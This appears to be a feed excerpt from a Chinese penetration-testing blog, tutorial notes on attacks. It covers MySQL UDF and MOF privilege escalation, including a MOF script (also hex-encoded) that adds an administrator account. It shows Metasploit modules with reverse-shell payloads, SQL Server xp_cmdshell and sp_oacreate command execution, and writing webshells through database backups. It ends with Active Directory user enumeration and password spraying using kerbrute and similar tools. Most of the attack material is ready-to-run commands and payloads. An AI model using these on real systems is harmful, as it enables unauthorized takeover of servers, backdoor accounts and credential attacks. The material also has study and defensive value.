                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211910126.png"
                      alt="image-20230417211910126"
                ></p>
<p>然后就可以执行这个函数，用来执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212016180.png"
                      alt="image-20230417212016180"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212029883.png"
                      alt="image-20230417212029883"
                ></p>
<p>攻击者可以利用生成的dl文件提供的函数执行系统命令。</p>
<p>sys_eval，执行任意命令，并将输出返回。</p>
<p>sys_exec，执行任意命令，并将退出码返回。</p>
<p>sys_get，获取一个环境变量。</p>
<p>sys_set，创建或修改一个环境变量。</p>
<p>全部流程就这样结束了</p>
<p>总结以下：</p>
<p>主要步骤就是获取数据库权限—–&gt;判断mysql版本 大于5.1还需要创建pliugin文件夹（失败了）—–&gt;然后就可以写入自定义函数—–&gt;之后就可以用自定义函数执行系统命令了</p>
<p>这个自定义函数主要工作原理就是调用udf.dll里面的指令执行的，udf.dll里面包含了一些执行系统命令的一些函数</p>
<p>这个sys_eval相当于一个壳用这个来调用udf.dll执行里面的系统指令</p>
<h4 id="MSF进行数据库提权"><a href="#MSF进行数据库提权" class="headerlink" title="MSF进行数据库提权"></a>MSF进行数据库提权</h4><p>一样的，数据库root用户一般不开启外联，所以需要执行命令开启外联</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>

<p>然后利用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块进行UDF提权</p>
<p>主要利用的步骤</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set 账号 密码</span><br><span class="line">set rhost 对方IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>主要就是MSF的UDF模块会向目录里面导入一个.dll文件，会自动插入mysql库的func里面，如果mysql版本大于5.1就得手动创建一个&#x2F;lib&#x2F;plugin文件夹</p>
<p>其他的步骤都和上面手动利用一样了，就不多赘述</p>
<h4 id="MySQL启动项提权"><a href="#MySQL启动项提权" class="headerlink" title="MySQL启动项提权"></a>MySQL启动项提权</h4><p>启动项提权主要也是利用MSF中的攻击模块进行的，这个也需要开启外联权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 对方IP地址</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>然后只需要等待数据库服务器重启就可以连接上了</p>
<p>主要原理就是在目标服务的启动项里写入RoNuO.exe执行文件，当服务重启时，这个文件也会被调用启动，然后就可以反弹shell至攻击机了</p>
<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>MOF是Windows系统的一个文件，位于c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，中文名叫做托管对象格式，作用就是每五秒就会去监控进程的创建和死亡</p>
<p>mof提权原理主要就是我们拿到了数据库的root权限之后就可以上传我们自己的mof文件，且root权限可以执行我们上传的mof，一定时间后mof就会被执行，其中有一段是vbs脚本，里面大多数是利用cmd添加管理员的命令</p>
<p>其实MOF提权并不局限于mysql数据库，这里，mysql数据库只是一个让我们向mof目录写入mof文件的一个桥梁，其他的可以达到同样目的的也可以造成mof提权</p>
<h4 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h4><p>前提已经拿到网站的shell，发现数据库</p>
<p>首先我们需要利用webshell工具把test.mof文件上传到www文件夹下</p>
<p>代码如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>还是得查看secure_file_priv的参数，看看mysql是否被允许导出文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure></div>

<p>是空就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418141726103.png"
                      alt="image-20230418141726103"
                ></p>
<p>接下来我们需要将在www文件夹下的test.mof文件导出至 C:\WINDOWS\system32\wbem\mof 下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;E:/phpstudy/phpstudy_pro/WWW/test.mof&#x27;) into dumpfile &#x27;C:/WINDOWS/system32/wbem/mof/test.mof&#x27;</span><br></pre></td></tr></table></figure></div>

<p>接下来只需要等待一段时间他就会自动执行了</p>
<p>一般来说mof文件夹中有bad和good文件夹，成功执行的会被放入good文件夹中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418142239889.png"
                      alt="image-20230418142239889"
                ></p>
<p>查询<code>net user</code>就知道它添加了一个管理员账户hacker了，提权成功</p>
<h4 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h4><p>直接利用sql语句将恶意代码写入到mof目录下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test2.mof&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>之所以十六进制编码传输是为了数据不丢失</p>
<h4 id="MSF自带模块提权"><a href="#MSF自带模块提权" class="headerlink" title="MSF自带模块提权"></a>MSF自带模块提权</h4><p>MSF中具有mof的提权模块</p>
<p>我们要先上传test.mof文件</p>
<p>然后设置一系列参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"> </span><br><span class="line"># 设置payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"> </span><br><span class="line"># 设置目标 MySQL 的基础信息</span><br><span class="line">set rhosts 对方IP</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>然后就行了</p>
<h4 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h4><p>由于mof文件会隔一段时间一直被调用，所以必须及时清除这个文件</p>
<p>但是想要清除这个文件必须要暂时关闭winmgmt服务再删除mof文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"> </span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"> </span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"> </span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker /delete</span><br><span class="line"> </span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure></div>

<p>然后mof提权的全部内容就这样结束了</p>
<h2 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL Server提权"></a>SQL Server提权</h2><p>SQL Server提权主要依赖于自带的存储过程，要求SQL Server 权限—-&gt;系统权限</p>
<p>而存储过程就是一个可编程的函数，他在数据库中创建并且保存，是存储在服务器中的一组预编译过的T-SQL语句，我们可以将存储过程认为是函数调用过程，可以使用execute命令执行存储过程</p>
<p>这个它主要分为系统存储过程，扩展存储过程，用户系定义的存储过程</p>
<p>存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用</p>
<p>扩展存储过程中主要是对动态链接库的（dll）函数调用，主要用于客户端于服务器端  或者和护短之间进行通信，以xp_为前缀</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>要执行系统命令，首先需要获取sqlserver数据库权限（sa），然后借助自带的存储过程进行提权，就可以实现SQL Server权限—–&gt;系统权限</p>
<h4 id="xp-cmdshell利用过程"><a href="#xp-cmdshell利用过程" class="headerlink" title="xp_cmdshell利用过程"></a>xp_cmdshell利用过程</h4><p>xp_cmdshell是一个扩展存储过程</p>
<p>可以让系统管理员具有操作cmd的权限，并且以文本方式返回输出</p>
<p>xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令</p>
<p>2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。</p>
<p>所以我们要先判断是否是sa权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>返回1就是</p>
<p>还要判断xp_cmdshell是否存在，1就是存在，0就是不存在</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161347953.png"
                      alt="image-20230418161347953"
                ></p>
<p>如果是0的话，可以执行下列命令开启</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure></div>

<p>不开启的话执行命令会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161455586.png"
                      alt="image-20230418161455586"
                ></p>
<p>要关闭的话</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;xp_cmdshell&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure></div>



<p>如果被删除可以通过xplog70.dll来恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure></div>



<p>但是…如果xplog70.dll也被删除了的也可以恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure></div>



<p>一切都配置好之后就可以通过xp_cmdshell来执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">或者</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161326688.png"
                      alt="image-20230418161326688"
                ></p>
<h4 id="sp-oacreate实现提权操作"><a href="#sp-oacreate实现提权操作" class="headerlink" title="sp_oacreate实现提权操作"></a>sp_oacreate实现提权操作</h4><p>当xp_cmdhsell被删除的时候，可以借助SQL Server中的COM 逐渐sp_oacreate来执行系统命令</p>
<p>原理是SQL Server提供和了一些函数访问OLE对象，sp_oacreate和sp_oamethod这两个可以调用OLE控件，间接来获取shell</p>
<h6 id="啥是OLE？"><a href="#啥是OLE？" class="headerlink" title="啥是OLE？"></a>啥是OLE？</h6><p>OLE是一种面向对象的技术，是一个API接口，里面包含了可以重复使用的软件组件(COM)</p>
<p>要判断是否可以使用sp_oacreate执行系统命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163725677.png"
                      alt="image-20230418163725677"
                ></p>
<p>如果报错的话，没事，还可以使用以下命令打开</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163825197.png"
                      alt="image-20230418163825197"
                ></p>
<p>然后就可以执行命令了，但是它没有回显，所以得用txt文件的形式导出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\test.txt&#x27; </span><br></pre></td></tr></table></figure></div>

<p>执行whoami得出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418164047098.png"
                      alt="image-20230418164047098"
                ></p>
<p>也可以使用这个来添加新用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user hack Password@ /add</span><br></pre></td></tr></table></figure></div>



<h4 id="使用CLR执行系统命令"><a href="#使用CLR执行系统命令" class="headerlink" title="使用CLR执行系统命令"></a>使用CLR执行系统命令</h4><p>SQL Server2005开始，就集成了用于Microsoft Windows 的 .NET Framework的公共语言运行时的（CLR）组件</p>
<p>这个意味着可以使用 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p>
<p>具体不太清楚，先空着吧</p>
<h4 id="数据库差异备份写webshell"><a href="#数据库差异备份写webshell" class="headerlink" title="数据库差异备份写webshell"></a>数据库差异备份写webshell</h4><p>差异备份数据库得到webshell，在SQL Server里面dbo和sa都有备份数据库的权限</p>
<p>我们可以吧数据库备份成asp文件，这样我们就可以通过mssqlserver的备份数据库生成一个网页小马</p>
<h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>具有db_owner权限</p>
<p>知道web绝对路径</p>
<h6 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步</span><br><span class="line">create DATABASE Testdb;</span><br><span class="line">第二步</span><br><span class="line">backup database Testdb to disk = &#x27;c:\test2.bak&#x27;;</span><br><span class="line">use Testdb;</span><br><span class="line">create table [dbo].[Testdb] ([cmd] [image]);</span><br><span class="line">insert into Testdb(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);</span><br><span class="line"></span><br><span class="line">3c3f70687020706870696e666f28293b3f3e为16进制的&lt;?php phpinfo();?&gt;，实际情况下可以改成一句话木马</span><br><span class="line"></span><br><span class="line">backup database Testdb to disk=&#x27;C:\\phpinfo.php&#x27; WITH DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165759713.png"
                      alt="image-20230418165759713"
                ></p>
<p>生成两个文件，其中phpinfo.php就是webshell换成一句话木马就具有攻击性了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165827318.png"
                      alt="image-20230418165827318"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165918697.png"
                      alt="image-20230418165918697"
                ></p>
<h4 id="日志差异备份写webshell"><a href="#日志差异备份写webshell" class="headerlink" title="日志差异备份写webshell"></a>日志差异备份写webshell</h4><p>这个的主要原理也是利用备份写入一句话木马</p>
<h6 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h6><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式</p>
<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>备份的文件大小比较小</p>
<h6 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database Testdb      --新建数据库Testdb</span><br><span class="line"></span><br><span class="line">alter database Testdb set RECOVERY FULL;   --修改数据库恢复模式为 完整模式</span><br><span class="line"></span><br><span class="line">create table cmd (a image);        --创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk= &#x27;C:\\1.php&#x27; with init;   --备份表到指定路径</span><br><span class="line"></span><br><span class="line">insert into cmd (a) values(0x3c3f706870706870696e666f28293b3f3e);  --插入一句话到cmd表里</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk=&#x27;C:\\phpinfo.php&#x27;;   --把操作日志备份到指定文件</span><br></pre></td></tr></table></figure></div>

<p>执行完后</p>
<p>一样的，就可以生成两个文件</p>
<p>其中phpinfo.php就是webshell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418170435006.png"
                      alt="image-20230418170435006"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>域渗透</title>
    <url>/2024/02/29/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="所处内网环境"><a href="#所处内网环境" class="headerlink" title="所处内网环境"></a>所处内网环境</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><h4 id="如何发现域"><a href="#如何发现域" class="headerlink" title="如何发现域"></a>如何发现域</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>查询139、445、88、389是否开启</p>
<p>88、389是处于域控下的</p>
<p>这样就能判断是否存在域环境</p>
<h5 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h5><p>查看一些凭据信息</p>
<p>cmdkey &#x2F;list、mimikatz抓取的信息</p>
<p>我这边没有凭据信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809095856180.png"
                      alt="image-20230809095856180"
                ></p>
<p>mimikzta收集信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813151315451.png"
                      alt="image-20230813151315451"
                ></p>
<h5 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h5><p>可以根据dns服务器的命名来判断是否有域，因为一般域控是作为域内的dns服务器来的</p>
<p>有时候工作组的机器用来域的到那时服务器</p>
<h5 id="网络设备、堡垒机等系统"><a href="#网络设备、堡垒机等系统" class="headerlink" title="网络设备、堡垒机等系统"></a>网络设备、堡垒机等系统</h5><p>显示一些网络拓扑的信息，堡垒机会存在一些主机的信息，可能有些域内主机、域控也会接入堡垒机的</p>
<h5 id="看内网服务"><a href="#看内网服务" class="headerlink" title="看内网服务"></a>看内网服务</h5><p>在一些内网的服务当中，可能有些服务是通过ldap认证的所以很可能就会存在域环境（邮件服务器）</p>
<p>exchange</p>
<h4 id="如何横向"><a href="#如何横向" class="headerlink" title="如何横向"></a>如何横向</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>收集一些如wiki、密码本、抓取hash、rdp凭据等信息</p>
<p>利用 一些口令复用&#x2F;hash传递（pth）</p>
<h5 id="攻击域网段的机器"><a href="#攻击域网段的机器" class="headerlink" title="攻击域网段的机器"></a>攻击域网段的机器</h5><p>端口扫描定位到域用户机器，看是否开放其他服务，如何看有什么漏洞（MS17-010），最后进行漏洞利用拿下域控</p>
<p>直接找到域控，看是否能漏洞利用</p>
<p>域用户枚举，在攻击者不在域内，通过域内的用户枚举</p>
<p>通过域内密码喷洒</p>
<h6 id="利用kerbrute，进行域内用户枚举"><a href="#利用kerbrute，进行域内用户枚举" class="headerlink" title="利用kerbrute，进行域内用户枚举"></a>利用kerbrute，进行域内用户枚举</h6><p>原理：kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不一样</p>
<p>利用这一点就可以枚举出域内用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种状态的错误代码分别为：</span><br><span class="line"></span><br><span class="line">KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）</span><br><span class="line">KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）</span><br><span class="line">KRB5DC_ERR_C_PRINCIPAL_U</span><br><span class="line"></span><br><span class="line">NKNOWN    在Kerberos数据库中找不到客户端（不存在）</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe  userenum --dc 192.168.30.10 -d hack-my.com user.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813152400588.png"
                      alt="image-20230813152400588"
                ></p>
<h6 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h6><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
<p><strong>喷洒原理</strong></p>
<p>就是在确认用户存在过后就会发送一个AS_REQ请求去，密码正确就会返回一个AS_REP，否则返回</p>
<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
<p>1.kerbrute工具</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.30.10 -d hack-my.com user.txt Admin！@#45（密码）</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813153147984.png"
                      alt="image-20230813153147984"
                ></p>
<p>2.ADPwdSpray.py</p>
<p>优点：可以利用hash值进行喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.30.10 hack-my.com user.txt clearpassword Admin！@#45(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.30.10 hack-my.com user.txt ntlmhash afffeba176210fad4628f0524bfe1942（密码hash） udp</span><br></pre></td></tr></table></figure></div>

<p>3.DomainPasswordSpray.ps1</p>
<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password Admin！@#45（密码）</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>



<h5 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h5><p>观察是否有域成员的进程—窃取token</p>
<p>当我们拿到一个服务器权限，可能是个服务账号权限较低，通过提权获取到机器账号，机器账号在域内是可以执行域内命令的，执行看是否横向到域</p>
<h5 id="通过堡垒机、vcenter等集权系统"><a href="#通过堡垒机、vcenter等集权系统" class="headerlink" title="通过堡垒机、vcenter等集权系统"></a>通过堡垒机、vcenter等集权系统</h5><h3 id="在域内"><a href="#在域内" class="headerlink" title="在域内"></a>在域内</h3><p>通过一些查询命令来获取</p>
<p>ipconfig &#x2F;all</p>
